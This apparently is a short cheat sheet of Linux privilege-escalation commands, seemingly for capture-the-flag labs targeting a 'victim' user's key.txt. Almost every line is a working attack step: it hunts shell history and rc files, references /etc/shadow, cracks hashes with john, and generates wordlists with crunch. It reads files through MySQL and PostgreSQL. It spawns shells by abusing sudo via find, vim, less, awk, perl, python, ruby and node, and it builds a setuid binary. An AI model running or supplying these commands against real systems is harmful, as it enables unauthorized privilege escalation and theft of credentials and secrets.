#robots.txt file and visit all the pages that are "disallowed" 
ls -a (the option -a will show the hidden files).
find /home -name .bash_history
find /home -name .bashrc
#the .bashrc file. is loaded when a user start a new shell
find /home -name .bashrc -exec grep [PATTERN] {} \;
#.bash_profile , /etc/shadow, crontab, anacron... cron jobs run daily in /etc/cron.daily/
find . -name .bashrc -exec grep export {} \; | grep -v GCC

strings #command returns each string of printable characters in files

john [FILE] --format=descrypt --show
#prefix $2$ or $2a$, Blowfish - $5$, SHA-256 - $6$, SHA-512  - $1$ MD5.
john [FILE] --format=md5crypt --show

crunch 5 5 -p a d m i n > testCrunch.txt

SELECT LOAD_FILE('/var/lib/mysql-files/key.txt')

# CREATE TABLE demo(t text);
# COPY demo from '/var/lib/postgresql/9.4/key.txt';
# SELECT * FROM demo;

sudo -l
sudo -u victim /bin/bash
sudo -u victim /usr/bin/find /home/victim -name key.txt -exec cat {} \;
sudo -u victim /usr/bin/find /home/victim -name key.txt -exec bash \;
sudo -u victim vim #:!/bin/bash
sudo -u victim less #:!/bin/bash
sudo -u victim awk '{print $1}' /home/victim/key.txt #awk 'BEGIN {system("/bin/bash")}'

ls -l /usr/bin/passwd
#s setgid setuid  program by chmod
#int main(void)
#{
#system("cat /home/victim/key.txt");
#}
gcc -o /tmp/[FILE] [FILE].c
chmod +xs [FILE]
sudo -u victim perl -e 'print  `cat /home/victim/key.txt `'
sudo -u victim perl -e 'print  `/bin/bash `'
cp /home/victim/key.txt /tmp/.key
chmod 777 /tmp/.key

sudo -u victim python
#from subprocess import call
#call(['/bin/bash'])

sudo -u victim /usr/bin/ruby -e 'require "irb" ; IRB.start(__FILE__)' #puts  `cat /home/victim/key.txt`

sudo -u victim node
#var exec = require('child_process').exec;
#exec('[COMMAND]', function (error, stdOut, stdErr) {
#console.log(stdOut);
#});